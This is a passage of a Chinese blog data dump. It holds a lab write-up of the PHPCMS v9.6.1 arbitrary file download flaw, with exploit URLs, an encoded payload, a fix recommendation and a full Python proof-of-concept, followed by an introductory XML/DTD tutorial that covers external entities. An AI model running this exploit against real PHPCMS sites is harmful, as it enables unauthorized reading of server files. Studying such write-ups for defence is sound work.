alt></p>\n<p>要点：</p>\n<blockquote>\n<ul>\n<li><code>src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是<code>/phpcms/modules/content/down.php</code>。</li>\n</ul>\n</blockquote>\n<p><strong>3.获取下载链接</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=</code>，并将上一步得到的xxx_att_json的值作为a_k参数的值。</p>\n<blockquote>\n<p><code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g</code></p>\n</blockquote>\n<p>访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/download.png\" alt></p>\n<h2 id=\"0x03-遇到的问题\"><a href=\"#0x03-遇到的问题\" class=\"headerlink\" title=\"0x03 遇到的问题\"></a>0x03 遇到的问题</h2><p>得到下载连接访问页面，点击下载会报参数错误。</p>\n<p>解决办法：</p>\n<blockquote>\n<ul>\n<li><code>https://blog.csdn.net/vindraz/article/details/12579211</code></li>\n<li><code>http://www.cmsyou.com/support/172.html</code></li>\n</ul>\n</blockquote>\n<h2 id=\"0x04-修复建议\"><a href=\"#0x04-修复建议\" class=\"headerlink\" title=\"0x04 修复建议\"></a>0x04 修复建议</h2><p>升级PHPCMS版本到9.6.2或以上。</p>\n<h2 id=\"0x05-PoC\"><a href=\"#0x05-PoC\" class=\"headerlink\" title=\"0x05 PoC\"></a>0x05 PoC</h2><ul>\n<li>Github：<code>https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py</code></li>\n<li>代码：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;<span class=\"string\">\"User-Agent\"</span>:<span class=\"string\">\"Mozilla/5.0 (Windows NT 6.1; WOW64)\"</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cookie1</span><span class=\"params\">(host)</span>:</span></span><br><span class=\"line\">    url_1 = host + <span class=\"string\">\"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1\"</span></span><br><span class=\"line\">    print(<span class=\"string\">\"[*] 请稍等...正在获取Cookie:\"</span>)</span><br><span class=\"line\">    reponse = requests.get(url_1,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        pattern = <span class=\"string\">r\".*siteid\"</span>  <span class=\"comment\">#phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> res:</span><br><span class=\"line\">                cookie1 = reponse.cookies.get(res[<span class=\"number\">0</span>])</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] 获取到Cookie1:\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] \"</span> + res[<span class=\"number\">0</span>] + <span class=\"string\">\":\"</span> + cookie1)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> cookie1</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[-] 获取Cookie1失败!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cookie2</span><span class=\"params\">(host,cookie1)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\">#该payload实现下载phpcms/modules/content/down.php文件 </span></span><br><span class=\"line\">    payload = <span class=\"string\">\"src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D\"</span></span><br><span class=\"line\">    <span class=\"comment\">#payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    url_2 = host + <span class=\"string\">\"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;\"</span> + payload</span><br><span class=\"line\">        </span><br><span class=\"line\">    data = &#123;<span class=\"string\">\"userid_flash\"</span>:cookie1&#125;  <span class=\"comment\">#将第一次得到的cookie作为\"userid_flash\"的值，并以POST方式提交</span></span><br><span class=\"line\">    reponse = requests.post(url_2,data=data,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        pattern = <span class=\"string\">r\".*att_json\"</span> <span class=\"comment\">#phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res:</span><br><span class=\"line\">                cookie2 = reponse.cookies.get(res[<span class=\"number\">0</span>])</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] 获取到Cookie2:\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] \"</span> + res[<span class=\"number\">0</span>] + <span class=\"string\">\":\"</span> + cookie2)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> cookie2</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[-] 获取Cookie2失败!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">help</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">\"-------------------------------------------------------------------------\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\" [*] 使用说明：给出index.php之前的部分\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\"       Usage: python3 phpcmsv9.py http://host:port\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\"     Example：python3 phpcmsv9.py http://localhost/phpcms\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\"-------------------------------------------------------------------------\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(sys.argv) != <span class=\"number\">2</span>:</span><br><span class=\"line\">        help()</span><br><span class=\"line\">        sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    host = sys.argv[<span class=\"number\">1</span>].strip()</span><br><span class=\"line\">    cookie1 = get_cookie1(host)</span><br><span class=\"line\">    cookie2 = get_cookie2(host,cookie1)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> cookie2:</span><br><span class=\"line\">        print(<span class=\"string\">\"[+] Open link to download file: \"</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"[+] \"</span> + host + <span class=\"string\">\"/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=\"</span> + cookie2) <span class=\"comment\">#最终文件下载连接</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-环境介绍\"><a href=\"#0x00-环境介绍\" class=\"headerlink\" title=\"0x00 环境介绍\"></a>0x00 环境介绍</h2><ul>\n<li>系统：Windows 10</li>\n<li>Phpstudy 2018</li>\n<li>CMS：PHPCMS v9.6.1<ul>\n<li>PHPCMS v9各版本下载地址：<code>http://download.phpcms.cn/v9/9.6/</code></li>\n</ul>\n</li>\n</ul>","more":"<h2 id=\"0x01-安装PHPCMS-v9\"><a href=\"#0x01-安装PHPCMS-v9\" class=\"headerlink\" title=\"0x01 安装PHPCMS v9\"></a>0x01 安装PHPCMS v9</h2><p>首先下载PHPCMS v9.6.1并解压，将解压得到的install_package目录拷贝到网站根目录下。</p>\n<p>启动phpstudy，访问<code>http://localhost/install_package/install/install.php</code>进入安装界面。</p>\n<p>依次点击下一步进行安装即可，数据库密码phpstudy默认是root/root。</p>\n<h2 id=\"0x02-漏洞利用\"><a href=\"#0x02-漏洞利用\" class=\"headerlink\" title=\"0x02 漏洞利用\"></a>0x02 漏洞利用</h2><p><strong>1.获取Cookie：xxx_siteid</strong></p>\n<p>首先访问<code>http://localhost/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>并获取Cookie。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/siteid.png\" alt></p>\n<p><strong>2.获取Cookie：xxx_att_json</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>，并将上一步获取的siteid的Cookie值作为POST字段userid_flash的值一同提交，然后从响应消息中找到xxx_att_json的Cookie值。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/att_json.png\" alt></p>\n<p>要点：</p>\n<blockquote>\n<ul>\n<li><code>src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D1%26catid%3D1%26s%3D./phpcms/modules/content/down.ph%26f%3Dp%3%25252%2*70C</code>是payload，是我们要下载的文件。此处我们使用的payload实现要下载的文件是<code>/phpcms/modules/content/down.php</code>。</li>\n</ul>\n</blockquote>\n<p><strong>3.获取下载链接</strong></p>\n<p>访问<code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=</code>，并将上一步得到的xxx_att_json的值作为a_k参数的值。</p>\n<blockquote>\n<p><code>http://localhost/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=61e9vtz6uMRQ6iACSVg06WBUXXslD430-hA7DDHM_5cMyGqOkQDeAPBXQURI2hDzEa-inCgLSjD2Ru66mQASlP3Qd06DqBJfeSuqMlZHaTOYO_VdhkWCDz8TD8SEQ3qoqho4ILiuVMSp7f_j05YY57YruJ1uIdHMbqaTyfClLBPv95lNtaRHQszhD9GZ0QEh8g</code></p>\n</blockquote>\n<p>访问过后，会返回一个带有下载按钮的页面，点击下载按钮即可下载。</p>\n<p><img src=\"/2019/02/25/phpcms9-6-1/download.png\" alt></p>\n<h2 id=\"0x03-遇到的问题\"><a href=\"#0x03-遇到的问题\" class=\"headerlink\" title=\"0x03 遇到的问题\"></a>0x03 遇到的问题</h2><p>得到下载连接访问页面，点击下载会报参数错误。</p>\n<p>解决办法：</p>\n<blockquote>\n<ul>\n<li><code>https://blog.csdn.net/vindraz/article/details/12579211</code></li>\n<li><code>http://www.cmsyou.com/support/172.html</code></li>\n</ul>\n</blockquote>\n<h2 id=\"0x04-修复建议\"><a href=\"#0x04-修复建议\" class=\"headerlink\" title=\"0x04 修复建议\"></a>0x04 修复建议</h2><p>升级PHPCMS版本到9.6.2或以上。</p>\n<h2 id=\"0x05-PoC\"><a href=\"#0x05-PoC\" class=\"headerlink\" title=\"0x05 PoC\"></a>0x05 PoC</h2><ul>\n<li>Github：<code>https://github.com/sh4douu/PoC-and-Exp/blob/master/phpcmsv961.py</code></li>\n<li>代码：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;<span class=\"string\">\"User-Agent\"</span>:<span class=\"string\">\"Mozilla/5.0 (Windows NT 6.1; WOW64)\"</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cookie1</span><span class=\"params\">(host)</span>:</span></span><br><span class=\"line\">    url_1 = host + <span class=\"string\">\"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1\"</span></span><br><span class=\"line\">    print(<span class=\"string\">\"[*] 请稍等...正在获取Cookie:\"</span>)</span><br><span class=\"line\">    reponse = requests.get(url_1,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        pattern = <span class=\"string\">r\".*siteid\"</span>  <span class=\"comment\">#phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> res:</span><br><span class=\"line\">                cookie1 = reponse.cookies.get(res[<span class=\"number\">0</span>])</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] 获取到Cookie1:\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] \"</span> + res[<span class=\"number\">0</span>] + <span class=\"string\">\":\"</span> + cookie1)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> cookie1</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[-] 获取Cookie1失败!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cookie2</span><span class=\"params\">(host,cookie1)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\">#该payload实现下载phpcms/modules/content/down.php文件 </span></span><br><span class=\"line\">    payload = <span class=\"string\">\"src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C\"</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D\"</span></span><br><span class=\"line\">    <span class=\"comment\">#payload = \"src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    url_2 = host + <span class=\"string\">\"/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;\"</span> + payload</span><br><span class=\"line\">        </span><br><span class=\"line\">    data = &#123;<span class=\"string\">\"userid_flash\"</span>:cookie1&#125;  <span class=\"comment\">#将第一次得到的cookie作为\"userid_flash\"的值，并以POST方式提交</span></span><br><span class=\"line\">    reponse = requests.post(url_2,data=data,headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        pattern = <span class=\"string\">r\".*att_json\"</span> <span class=\"comment\">#phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reponse.cookies.keys():</span><br><span class=\"line\">            res = re.findall(pattern,item)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res:</span><br><span class=\"line\">                cookie2 = reponse.cookies.get(res[<span class=\"number\">0</span>])</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] 获取到Cookie2:\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"[+] \"</span> + res[<span class=\"number\">0</span>] + <span class=\"string\">\":\"</span> + cookie2)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> cookie2</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[-] 获取Cookie2失败!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">help</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">\"-------------------------------------------------------------------------\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\" [*] 使用说明：给出index.php之前的部分\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\"       Usage: python3 phpcmsv9.py http://host:port\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\"     Example：python3 phpcmsv9.py http://localhost/phpcms\"</span>)</span><br><span class=\"line\">    print(<span class=\"string\">\"-------------------------------------------------------------------------\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(sys.argv) != <span class=\"number\">2</span>:</span><br><span class=\"line\">        help()</span><br><span class=\"line\">        sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    host = sys.argv[<span class=\"number\">1</span>].strip()</span><br><span class=\"line\">    cookie1 = get_cookie1(host)</span><br><span class=\"line\">    cookie2 = get_cookie2(host,cookie1)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> cookie2:</span><br><span class=\"line\">        print(<span class=\"string\">\"[+] Open link to download file: \"</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"[+] \"</span> + host + <span class=\"string\">\"/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=\"</span> + cookie2) <span class=\"comment\">#最终文件下载连接</span></span><br></pre></td></tr></table></figure>"},{"title":"XML基本知识学习","date":"2019-02-28T07:10:47.000Z","_content":"\n## 0x00 XML概述\n\n- XML 指可扩展标记语言（eXtensible Markup Language）。\n- XML 的设计宗旨是传输数据，而不是显示数据。\n- XML 标签没有被预定义。\n- XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。\n\n> XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。\n\n<!-- more -->\n\n**XML与HTML**\n\n1.XML 和 HTML 为不同的目的而设计：\n\n> - XML 被设计用来传输和存储数据。\n> - HTML 被设计用来显示数据。\n\n2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。\n\n**3.XML 是独立于软件和硬件的信息传输工具。**\n\n## 0x01 XML结构\n\n> XML文档是树形结构的，由根元素扩展，且必须包含根元素。\n\n**一个栗子:**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<note date=\"9102/2/28\">\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n- 第一行是XML声明，指定XML版本以及编码方式，声明是可选的。\n- `<note>`为根元素，XML标签都是成对且闭合的，以`</note>`闭合标签。\n- XML是大小写敏感的，`<note>`与`<Note>`是不同的标签。\n- 标签是可以设置属性的，如例子中`<note>`标签的`date`，但是属性的值必须使用引号括起来。\n\n**实体引用：**\n\n在 XML 中，一些字符拥有特殊的意义。\n\n例如，如果把字符 \"<\" 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。\n\n```xml\n<!-- 使用下面会发生错误 -->\n<message>if salary < 1000 then</message>\n```\n\n为了避免这个错误，用**实体引用**来代替 \"<\" 字符：\n\n```xml\n<message>if salary &lt; 1000 then</message>\n```\n\nXML有5个预定义的实体引用：\n\n![](xml\\QQ截图20190228152213.png)\n\n## 0x02 DTD\n\n文档类型定义（DTD）可定义合法的XML文档构建模块。\n\n**1.为什么使用DTD？**\n\n通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。\n\n通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。\n\n还可以用DTD 来验证从外部接收到的、自身的数据。\n\n**2.DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。**\n\ni.在文档内声明的栗子：`<!DOCTYPE root-element [element-declarations]>`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    #定义此文档是 note 类型的文档。\n  <!ELEMENT note (to,from,heading,body)>   #定义note元素有四个元素：\"to、from、heading、body\"\n  <!ELEMENT to (#PCDATA)>\n  <!ELEMENT from (#PCDATA)>\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body (#PCDATA)>   #定义body元素为\"#PCDATA\"类型\n]>\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend</body>\n</note>\n```\n\nii.作为外部引用的例子：`<!DOCTYPE root-element SYSTEM \"filename\">`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"note.dtd\">  #引用外部文件note.dtd\n<note>\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n`note.dtd`文件内容：\n\n```xml-dtd\n<!ELEMENT note (to,from,heading,body)>\n<!ELEMENT to (#PCDATA)>\n<!ELEMENT from (#PCDATA)>\n<!ELEMENT heading (#PCDATA)>\n<!ELEMENT body (#PCDATA)>\n```\n\n**3.DTD实体**\n\n**实体**是用于定义引用普通文本或特殊字符的快捷方式的变量。\n\n**实体引用**是对实体的引用。引用后会获得实体指向的实际数据。\n\n**实体声明也是在DTD声明中，与元素声明同级。**\n\ni.在文档内部声明实体的例子：`<!ENTITY entity-name \"entity-value\">`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   #定义note元素可以有任意元素。\n  \n  <!ENTITY entity1 \"Be\">      #文档内声明\n  <!ENTITY entity2 \"back.\">\n]>\n<note>&entity1; &entity2;</note>\n```\n\nii.外部声明引用实体的例子：`<!ENTITY entity-name SYSTEM \"URI/URL\">` or `<!DOCTYPE 根元素 PUBLIC \"public_ID\" \"文件名\">`\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY entity1 SYSTEM \"http://www.sakuxa.com/example.xml\">  #system关键字表示外部引用\n]>\n<note> &entity1;</note>\n```\n\niii.参数实体\n\n参数实体只用于 DTD 和文档的内部子集中。只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。\n\n**记住：%entity; 会被它指向的数据进行直接替换。**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note ANY>   \n  \n  <!ENTITY % entity1 SYSTEM \"http://www.sakuxa.com/example.dtd\">\n  %entity1  #会被example.dtd内容替换\n]>\n<note> &entity2;</note>\n```\n\n`example.dtd`文件内容：\n\n```xml-dtd\n<!ENTITY entity2 \"Be back.\">\n```\n\n**注意：** 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。","source":"_posts/xml.md","raw":"---\ntitle: XML基本知识学习\ndate: 2019-02-28 15:10:47\ntags: \n\t- XML\n\t- Language\ncategories:\n\t- 语言\n---\n\n## 0x00 XML概述\n\n- XML 指可扩展标记语言（eXtensible Markup Language）。\n- XML 的设计宗旨是传输数据，而不是显示数据。\n- XML 标签没有被预定义。\n- XML 被设计用来结构化、存储以及传输信息，实际上XML没有做任何事情。\n\n> XML只是以某种结构化形式组织数据，说它没有做任何事是他不会像HTML被渲染为形象色色的网页。\n\n<!-- more -->\n\n**XML与HTML**\n\n1.XML 和 HTML 为不同的目的而设计：\n\n> - XML 被设计用来传输和存储数据。\n> - HTML 被设计用来显示数据。\n\n2.HTML 中使用的标签都是预定义的，XML 允许创作者定义自己的标签和自己的文档结构。\n\n**3.XML 是独立于软件和硬件的信息传输工具。**\n\n## 0x01 XML结构\n\n> XML文档是树形结构的，由根元素扩展，且必须包含根元素。\n\n**一个栗子:**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<note date=\"9102/2/28\">\n  <to>Mikasa</to>\n  <from>Allen</from>\n  <heading>Reminder</heading>\n  <body>Don't forget me this weekend!</body>\n</note>\n```\n\n- 第一行是XML声明，指定XML版本以及编码方式，声明是可选的。\n- `<note>`为根元素，XML标签都是成对且闭合的，以`</note>`闭合标签。\n- XML是大小写敏感的，`<note>`与`<Note>`是不同的标签。\n- 标签是可以设置属性的，如例子中`<note>`标签的`date`，但是属性的值必须使用引号括起来。\n\n**实体引用：**\n\n在 XML 中，一些字符拥有特殊的意义。\n\n例如，如果把字符 \"<\" 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。\n\n```xml\n<!-- 使用下面会发生错误 -->\n<message>if salary < 1000 